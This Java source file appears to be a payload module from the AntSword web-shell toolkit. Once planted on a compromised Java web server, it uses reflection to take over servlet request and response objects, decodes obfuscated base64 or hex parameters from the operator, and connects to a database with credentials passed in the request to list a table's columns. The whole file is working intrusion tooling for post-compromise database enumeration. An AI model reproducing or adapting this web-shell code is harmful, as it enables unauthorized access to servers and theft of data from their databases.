import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.sql.*;

public class Show_columns {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder;
    public String cs;
    public String randomPrefix;

    @Override
    public boolean equals(Object obj) {
        try{
            if(Class.forName("javax.servlet.jsp.PageContext").isInstance(obj)){
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
            }
        }catch (ClassNotFoundException | NoSuchMethodException pageContextErrorExection) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            } else if (obj instanceof HttpServletResponse) {
                response = (HttpServletResponse) obj;
                try {
                    Field resp = response.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
                    Field req = response2.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    request = (HttpServletRequest) req.get(response2);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargencode";
        String varkey2 = "antswordargconn";
        String varkey3 = "antswordargdb";
        String varkey4 = "antswordargtable";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = EC(decode(request.getParameter(varkey1) + ""));
            String z2 = EC(decode(request.getParameter(varkey2) + ""));
            String z3 = EC(decode(request.getParameter(varkey3) + ""));
            String z4 = EC(decode(request.getParameter(varkey4) + ""));
            output.append(tag_s);
            sb.append(showColumns(z1, z2, z3, z4));
            output.append(sb.toString());
            output.append(tag_e);
            response.getWriter().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s ) throws Exception {
        if (encoder.equals("hex") )
            return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str ) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("hex")) {
            if (str == null || str.equals("")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encoder.equals("base64")) {
            byte[] bt = null;
            String version = System.getProperty("java.version");
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new  Object[]{});
                bt = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);   
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.getDeclaredConstructor().newInstance();
                bt = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
            }
            
            return new String(bt, "UTF-8");
        }
        return str;
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1];
        Connection c = DriverManager.getConnection(url, x[2], x[3]);
        Statement stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        ResultSetMetaData rsmd = rs.getMetaData();

        if (needcoluname) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnName = rsmd.getColumnName(i);
                ret += columnName + columnsep;
            }
            ret += rowsep;
        }

        while (rs.next()) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnValue = rs.getString(i);
                ret += columnValue + columnsep;
            }
            ret += rowsep;
        }
        return ret;
    }

    String showColumns(String encode, String conn, String dbname, String table) throws Exception {
        String columnsep = "\t";
        String rowsep = "";
        String sql = "select * from " + dbname + "." + table + " WHERE ROWNUM=0";
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }

}